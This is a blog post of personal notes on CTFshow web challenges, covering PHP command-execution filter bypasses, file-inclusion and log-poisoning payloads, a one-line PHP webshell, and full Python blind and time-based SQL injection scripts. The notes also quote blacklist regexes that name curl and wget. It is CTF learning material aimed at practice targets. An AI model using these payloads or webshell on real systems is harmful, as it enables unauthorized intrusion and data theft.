---
title: CTFSHOW WEB入门 Ttick总结
date: 2020-11-01 18:01:49
categories: 
- [CTF做题记录]
- [总结]
---
只记录一些tick，不是wp
>PHP文档中使用的伪类型与变量
>- `mixed` --> 说明一个参数可以接受多种不同的（但不一定是所有的）类型
例如 gettype() 可以接受所有的 PHP 类型，str_replace() 可以接受字符串和数组
>- `number` --> 说明一个参数可以是 integer 或者 float
>- `array|object` --> 意思是参数既可以是 array 也可以是 object
>- `void` --> 作为返回类型意味着函数的返回值是无用的。void 作为参数列表意味着函数不接受任何参数。从 PHP 7.1 开始 void 接受一个函数为返回类型
>- `...` --> 在函数原型中，`$...` 表示等等的意思。当一个函数可以接受任意个参数时使用此变量名

<!-- TOC -->

- [信息搜集](#信息搜集)
    - [web5](#web5)
    - [web6](#web6)
    - [web14](#web14)
    - [web16](#web16)
    - [web19](#web19)
    - [web20](#web20)
- [爆破](#爆破)
    - [web21](#web21)
- [命令执行（RCE）](#命令执行rce)
    - [web31](#web31)
    - [web32-36](#web32-36)
- [!/bin/sh](#binsh)
- [encoding: utf-8](#encoding-utf-8)
- [encoding: utf-8](#encoding-utf-8-1)
- [encoding: utf-8](#encoding-utf-8-2)
- [py2](#py2)
- [encoding: utf-8](#encoding-utf-8-3)
- [@Author:  yq1ng](#author--yq1ng)
- [@Date:    2020-11-09 18:30](#date----2020-11-09-1830)
- [-*- coding: utf-8 -*-](#---coding-utf-8---)
- [@Author: h1xa](#author-h1xa)
- [@Date:   2020-11-07 05:00:51](#date---2020-11-07-050051)
- [@Last Modified by:   h1xa](#last-modified-by---h1xa)
- [@Last Modified time: 2020-11-07 16:28:53](#last-modified-time-2020-11-07-162853)
- [@email: h1xa@ctfer.com](#email-h1xactfercom)
- [@link: https://ctfer.com](#link-httpsctfercom)

<!-- /TOC -->

<!--more-->
# 信息搜集
## web5
php文件泄露，访问`index.phps`
## web6
常见文件备份参见[此博客](https://www.cnblogs.com/Lmg66/p/13598803.html)
## web14
泄露重要(editor)的信息 直接在url后面添加/editor
## web16
payload:`/tz.php` --> 雅黑PHP探针\
PHP探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag
## web19
前台输入密码浏览器转码了，抓包重放
## web20
mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag

---
# 爆破
## web21
bp爆破的custom iterator(自定义迭代器)应用\
需要进行base64编码：payload processing 进行编码设置\
取消Palyload Encoding编码 因为在进行base64加密的时候在最后可能存在 == 这样就会影响base64 加密的结果

---
# 命令执行（RCE）
## web31
`if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c))`\
过滤空格：`%09`、`${IFS}`、`$IFS$9`、`<>`、`<`
自己的payload：?c=echo(\`tail%09f*\`);
搜集的：

```php
show_source(next(array_reverse(scandir(pos(localeconv())))));

c=$a=show_source($_GET[1])?>&1=flag.php

c=eval($_GET[1])?>&1=system('cat flag.php');

c=?><?=`$_GET[1]`;&1=cat flag.php//查看源代码
c=?><?=passthru($_GET[1]);&1=cat flag.php//查看源代码
```
## web32-36
```if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c))```\
payload:
`?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php`
## web37/39
```php
if(!preg_match("/flag/i", $c)){ 
    include($c); 
    echo $flag; 
}
if(!preg_match("/flag/i", $c)){ 
    include($c.".php"); 
} 
//?c=data://text/plain,<?php system('cat f*');?>
//39 output：$flag="flag{8262a004-69e7-460b-b412-05d4178c08f8}";.php
//39 data://text/plain, 这样就相当于执行了php语句 .php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么 作用
```
## web38
```php
if(!preg_match("/flag|php|file/i", $c)){
    include($c);
    echo $flag;
}
//过滤了php和file
//?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==
```
## web40
```php
if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
    eval($c);
}
```
这题跟[GXYCTF2019的禁止套娃](https://yq1ng.github.io/z_post/BUUOJ-[GXYCTF2019]-WEB-WP/#%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83)很像，参考一下\
在看一个利用session的~~题解~~
`?c=session_start();system(session_id());`
在session处添加一条记录：`PHPSESSID:ls`，可以列出文件，再改成`c=session_start();highlight_file(session_id());`，flag读不出来。。凉
>引自[羽大佬博客](https://blog.csdn.net/miuzzx/article/details/108415301)\
经过测试发现，受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的
## [web41](https://blog.csdn.net/miuzzx/article/details/108569080)
```php
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
    eval("echo($c);");}
```
exp已经保存了，哈哈
## web42
`system($c." >/dev/null 2>&1");`\
详解：https://blog.csdn.net/ithomer/article/details/9288353
>`/dev/null` ：代表空设备文件\
`>`  ：代表重定向到哪里，例如：echo "123" > /home/123.txt\
`1`  ：表示stdout标准输出，系统默认值是1，所以">/dev/null"等同于"1>/dev/null"\
`2`  ：表示stderr标准错误\
`&`  ：表示等同于的意思，2>&1，表示2的输出重定向等同于1\

`1 > /dev/null 2>&1 `语句含义：\
`1 > /dev/null` ： 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是不显示任何信息。\
`2>&1` ：接着，标准错误输出重定向（等同于）标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。\
payload：`?c=cat flag*%0a`，`%0a`进行换行
## web52
```php
if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c))
```
往上payload：`?c=nl${IFS}fla%27%27g.php%0a`通杀
## web54
```php
if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c))
    system($c);
```
payload：`?c=/bin/?at${IFS}f???????`\
cat什么的被过滤了就要从bin下再把它引出来
## web55
```php
<?php
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```
Lazzaro师傅真狠啊，字母全凉了，不过羽师傅提供了一个[骚思路](https://blog.csdn.net/qq_46091464/article/details/108555433)，真是活久见。。\
1. payload：`?c=/???/????64 ????.???` -->  `/bin/base64 flag.php`
2. 通过该命令压缩flag.php 然后进行下载\
    payload：`?c=/???/???/????2 ????.???`
    也就是`/usr/bin/bzip2 flag.php`
    然后访问`/flag.php.bz2`进行下载获得`flag.php`
## web56
```php
if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c))
```
和上题类似，过滤内容变了，这次数字也不能用了，附上[P牛博客](leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)和[Firebasky师傅博客](https://blog.csdn.net/qq_46091464/article/details/108513145)还有[Y1ng师傅](https://www.gem-love.com/websecurity/1407.html)\
linux中`.`相当于`source`可以执行sh命令，且无需执行权限，[具体介绍点此](http://blog.sina.com.cn/s/blog_af68a2c201016nh2.html)\

1. 构造上传页面
    ```html
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>POST数据包POC</title>
    </head>
    <body>
    <form action="http://45e8c3c6-fd54-4110-a17f-3dff9f3e68a2.chall.ctf.show/" method="post" enctype="multipart/form-data">
    <!--链接是当前打开的题目链接-->
        <label for="file">文件名：</label>
        <input type="file" name="file" id="file"><br>
        <input type="submit" name="submit" value="提交">
    </form>
    </body>
    </html>
    ```
2. 抓包，构造poc命令执行\
发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母，看一下ASCII表，可以发现大写字母在`@`和`[`之间，而Linux的glob通配符支持利用`[0-9]`来表示一个范围，那么就可以用`[@-[]`来表示大写字母\
![ASCII](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.png)

然后传文件，并添加sh命令，有时候并不会执行成功，因为最后一位不一定一直是大写字母，多试几次\
`/?c=.%20/???/????????[@-[]`

```sh
#!/bin/sh
ls
```
![result_ls](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.xqklo38zuce.png)

接着读取flag即可

## web57
```php
<?php
// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```
不懂，上payload：`$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))`

![](https://img-blog.csdnimg.cn/20201105182344281.png#pic_center)
输出36
>原理\
`${_} ="" ` //返回上一次命令\
`$((${_}))=0`\
`$((~$((${_}))))=-1`\
然后拼接出-36在进行取反

多学一招
## web71
```php
<?php
//@Author: Lazzaro
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();//读取缓冲区内容，不清楚缓冲区
        ob_end_clean();//清楚缓冲区
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>
你要上天吗？
```
~~没见过这样的~~，payload：`c=include('/flag.txt');exit();`\
试了试，不用`exit();`的话，后面会被替换为`???`之类的

# 文件包含(LFI)
## web79
```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```
过滤了php，可以用`data`协议执行系统函数，payload：`?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <?php system('cat flag.php');`
## web80&81
```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```
日志包含，bp抓包改UA头`<?php system("ls");?>`，接着cat或者`<?php system(base64 fl0g.php';?)`

# PHP特性
## web89
>数组绕过正则表达式\
返回完整匹配次数（可能是0），或者如果发生错误返回FALSE
```php
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```
没想到数组，那就记下来，payload：`?num[]=1`
## web91
```php
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```
payload:`?cmd=%0aphp`（%0a就是换行or`\n`）\
很有意思，首先要知道`^$`是匹配一段文本中每行的开始和结束位置，在看他俩的介绍
>`^` 匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 '\n' 或 '\r' 之后的位置\
`$` 匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 '\n' 或 '\r' 之前的位置
![i m](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.8i160rqgpag.png)

第一次匹配是多行（成功），第二次一行（失败），传入payload正好可以绕过
## web90 | 92 | 93 | 94 | 95
```php
<?php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```
>`strpos()` --> strpos — 查找字符串首次出现的位置\
>- `strpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : int`\
返回 needle 在 haystack 中首次出现的数字位置\
`offset` --> 如果提供了此参数，搜索会从字符串该字符数的起始位置开始统计。 如果是负数，搜索会从字符串结尾指定字符数开始(-3：从倒数第三个字符开始查找)。

>`intval()` -->  获取变量的整数值(向下取整)(`ceil()`向上取整)
>- `intval ( mixed $var [, int $base = 10 ] ) : int`\
通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。
>- Note:\
如果 base 是 0，通过检测 var 的格式来决定使用的进制：
>>如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
>>如果字符串以 "0" 开始，使用 8 进制(octal)；否则，\
>>将使用 10 进制 (decimal)。

PHP很有意思的特性，大多函数总是会修剪多余的空白字符，所以只需要用八进制，并在数值前加上空格即可，payload：`?num= 010574`\
补：92Hint:\
intval()函数如果`$base`为0则`$var`中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以
## web98
这题看见直接懵逼了，可怕的三目运算，其实不想记录的，纠结一下还是写上吧，算是代码混淆，吓走你哈哈哈
```php
<?php
include("flag.php");
$_GET?$_GET=&$_POST:'flag';//如果GET到参数就用POST得的flag参数覆盖
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);
?>
```
中间两行GET没用，不传flag\
payload：`GET: ?a=a` `POST: HTTP_FLAG=flag`
## web99
```php
<?php
highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));//向数组里面插入随机数
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1
    file_put_contents($_GET['n'], $_POST['content']);
}
?>
```
>`in_array()` --> 检查数组中是否存在某个值
>- `in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool`\
大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较
>- `strict` 如果第三个参数 strict 的值为 TRUE 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同\
可以理解为不加true就是弱比较(==)，加上true就是强比较(===)

payload：`GET: n=1.php` `POST: content=<?php eval($_POST[1]);?>`之后蚁剑

## web100 | 101

```php
<?php
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }
}
```

预期解：

1. and与&&的区别\
   `$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);`\
   只需要第一个是数值即可使v0为数值
   `$v0=is_numeric($v1) && is_numeric($v2) && is_numeric($v3);`
   需要全部都是数值
2. [反射类](https://www.php.net/manual/zh/class.reflectionclass.php)\
   不过最简单的就是new一个类在输出，payload：`?v1=1&v2=echo new ReflectionClass&v3=;`\
100非预期：\
看到`eval`就应该想起来前面练习的RCE~~没想起来~~方法较多\
payload：\
``?v1=1&v2=&v3=?><?=`tail ctfshow.php`;``\
``?v1=1&v2=?><?php echo `ls`?>/*&v3=;*/``

## web102 | 103

```php
<?php
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}
```

考点：`hex2bin()`\
大意就是找出一个经过16进制编码后一句话，其不带任何字母，再经过`call_user_func()`调用`hex2bin()`转换回去写到文件里面进行getshell
```php
<?php
$a='<?=`cat *`;';
$b=base64_encode($a);  // PD89YGNhdCAqYDs=
$c=bin2hex($b);      //这里直接用去掉=的base64
//输出   5044383959474e6864434171594473
```
payload：(v2前面随便加两个数字，绕substr的)\
`GET: v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php` `POST: v1=hex2bin`


# sql
## web174
`$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";`\
~~妈的(无能狂怒)，~~ 是盲注，道行太浅一直没想到，脚本：
```python
import requests

flag = ''
for i in range(1, 45):
    for j in r'0123456789abcdefghijklmnopqrstuvwxyz-{}':
        url = "http://eaf7f762-c08b-4374-b8d1-396518d73c69.chall.ctf.show/api/v4.php?id="
        payload = '''1' and substr((select password from ctfshow_user4 where username="flag"),%d,1)="%c"--+'''% (i,j)
        r = requests.get(url + payload)
        #print(url+payload)
        #print(r.text)
        if 'admin' in r.text:
            flag += j
            print(flag)
            break
```
## web175
` if(!preg_match('/[\x00-\x7f]/i', json_encode($ret))){`过滤了所有字符，时间盲注
```py
# encoding: utf-8
import requests
import time

url = '''http://14e03d71-0f5b-4a4d-b819-884aeb24fbe8.chall.ctf.show/api/v5.php?id=1' '''
flag = ''

for i in range(1,50):
    for j in r'{}0123456789abcdefghijklmnopqrstuvwxyz-':
        #开始计时
        before_time = time.time()
        payload = 'and if(substr((select password from ctfshow_user5 where username="flag"),%d,1)="%c",sleep(3),0)--+'% (i,j)
        r = requests.get(url+ payload)
        #返回时间
        after_time = time.time()
        offset = after_time - before_time
        if offset > 2.8:
            flag += j
            print(flag)
            break
```
## web176-179
payload：`URL/api/?id='or(1)%23`通杀
## web180
payload：`URL/api/?id='or(mid(username,1,1)='f')and'1'='1`
## web181 | 182
sql语句：`$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";`\
waf：`preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i', $str)`\
通杀payload：`URL/api/?id='or(mid(username,1,1)='f')and'1'='1`
## web183
sql：`$sql = "select count(pass) from ".$_POST['tableName'].";";`\
waf：`preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i', $str)`\
盲注，一开始用的`mid()`，数据干扰太多，用了`right()`，附上*一样的脚本，需要手动停止，没~~懒得~~判断嘿嘿
```python
# encoding: utf-8
import requests

url = '''http://898034b5-dc30-4856-9230-a65688cba1ac.chall.ctf.show/select-waf.php'''
data = {"tableName":""}
flag = '}'
s = requests.session()

for x in range(2,50):
    for y in r'abcdefghijklmnopqrstuvwxyz{-}0123456789':
        data["tableName"]="(ctfshow_user)where(right(pass,%d))like'%s'"%(x,y+flag)
        #print(data)
        s = requests.post(url,data = data)
        #print(s.text)  
        if '$user_count = 1;' in s.text:
            flag = y + flag
            print(flag)
            break
```
## web184
sql：`$sql = "select count(*) from ".$_POST['tableName'].";";`\
waf：``preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str)``\
emmm，费老牛鼻子劲，太菜了，嘤嘤嘤，第一次用join写脚本，用群主的字典效率高点
```python
# encoding: utf-8
# py2
import requests

url = '''http://e5e91710-3aa2-4752-a2a0-68a6c18fee26.chall.ctf.show/select-waf.php'''
data = {"tableName":""}
flag = 'flag{'

for x in range(6,50):
    for y in r'abcdefghijklmnopqrstuvwxyz0123456789{-}':
        #字典：flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}   #群主亲传效率高
        temp = "0x"+(flag+y).encode('hex')
        data["tableName"]='ctfshow_user x right join ctfshow_user y on left(y.pass,%d) like %s'%(x,temp)
        #print(data)
        s = requests.post(url,data = data)
        #print(s.text)  
        if '$user_count = 22;' not in s.text:
            flag =  flag + y
            print(flag)
            break
```
## web185 | 186
185的sql和waf忘了写，不过都是一个脚本，没差\
186sql：`$sql = "select count(*) from ".$_POST['tableName'].";";`\
186waf：``preg_match('/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\<|\>|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i', $str)``\
额，这么慢才出。。。耽搁挺长时间，还是自己太菜了，欸，if的43先自己判断下，系列题目，flag格式固定
![waf数字](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.e8x3axfwwan.png)
![waf数字字母](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.oys89ez7sjb.png)
```python
# encoding: utf-8
# @Author:  yq1ng
# @Date:    2020-11-09 18:30

import requests

url = '''http://7a27816c-2c96-4544-b3ba-f0867f97f250.chall.ctf.show//select-waf.php'''
data = {"tableName":""}
flag = 'flag{'
payload = ''

def Construct_numbers(num):
    result = '!(!pi())'
    if num != 1:
        for i in range(num-1):
            result = result+'+'+'!(!pi())'
    return result

for x in range(6,43):
    for y in r'abcdefghijklmnopqrstuvwxyz0123456789{-}':
        #字典：flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}   #群主亲传效率高
        data["tableName"] = 'ctfshow_user x right join ctfshow_user y on (hex(substr(y.pass,%s,%s)))like(hex(%s))'%(Construct_numbers(x),Construct_numbers(1),Construct_numbers(ord(y)))
        #print(data)
        s = requests.post(url,data = data)
        #print(s.text)
        if '$user_count = 43;' in s.text:
            flag += y
            print(flag)
            break
```
附上群主的脚本，更快，更美观
```python
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-11-07 05:00:51
# @Last Modified by:   h1xa
# @Last Modified time: 2020-11-07 16:28:53
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

import requests

url = 'http://7a27816c-2c96-4544-b3ba-f0867f97f250.chall.ctf.show//select-waf.php'

payload = 'ctfshow_user as a right join ctfshow_user as b on hex(substr(b.pass,{},{}))regexp(hex({char}))'

strings = 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'

prefix= 'flag{'

def create_num(num):
	ret = 'hex(ceil(cot(-(ascii(char_length(now()))))))'
	if num != 1:
		for i in range(num-1):
			ret = ret+'+'+'hex(ceil(cot(-(ascii(char_length(now()))))))'
	return ret;


def getFlag():
	#proxies = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
	flag=''
	for i in range(42):
		print('[+] 开始盲注第{}位'.format(i+1))
		for n in strings:
			data = {
				'tableName':payload.format(create_num(i+1),create_num(1),char=create_num(ord(n)))
			}
			ret = requests.post(url,data)
			#ret = requests.post(url,data,proxies = proxies,verify=False);
			if ret.text.find('43')>0:
				if i < 5:
					if n in prefix:
						flag=flag+n
						print('[+] 盲注第{}位'.format(i+1)+"字符{}".format(n)+"成功")
				else:
					flag=flag+n
					print(data)
					#print(ret.text)
					print('[+] 盲注第{}位'.format(i+1)+"字符{}".format(n)+"成功")
				break
			#else:
				#print('[+] 盲注第{}位'.format(i+1)+"字符{}".format(chr(n))+"失败 数字为{}".format(n))
				#print('[+] payload为{}'.format(payload.format(create_num(i+1),create_num(1),char=create_num(ord(n)))))
	return flag

print(getFlag())
```
## web187
sql: `$sql = "select count(*) from ctfshow_user where username = '$username' and password= '$password'";`\
```php
//waf:
    $username = $_POST['username'];
    $password = md5($_POST['password'],true);

    //只有admin可以获得flag
    if($username!='admin'){
        $ret['msg']='用户名不存在';
        die(json_encode($ret));
    }
```
`md5($_POST['password'],true)`很经典的一个题目，详细了解可移步我的[这篇博客](https://yq1ng.github.io/z_post/BJDCTF2020%E5%85%A8%E5%AE%B6%E6%A1%B6/#bjdctf2020easy-md5)，直接用`ffifdyop`作为密码登陆即可
## web188
sql：`$sql = "select pass from ctfshow_user where username = {$username}";`
```php
//waf
 //用户名检测
  if(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }
```
